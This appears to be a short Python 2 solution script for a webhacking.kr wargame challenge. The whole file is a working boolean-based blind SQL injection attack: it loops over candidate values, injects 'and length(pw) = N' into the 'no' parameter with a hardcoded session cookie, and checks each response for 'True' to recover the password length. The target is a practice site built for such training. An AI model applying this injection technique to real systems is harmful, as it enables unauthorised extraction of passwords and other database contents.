#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import urllib2
import time
 
session = "225b0794pin51g388pbvp9o7k3"
url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"
for len in xrange(0,30):
    query = "?no=2%20and%20length(pw)%20=%20" + str(len)
    req = urllib2.Request(url+query)
    req.add_header("Cookie","PHPSESSID="+session)
    if -1 != urllib2.urlopen(req).read().find("True"):
        print "length : " + str(len)
    time.sleep(0.1)
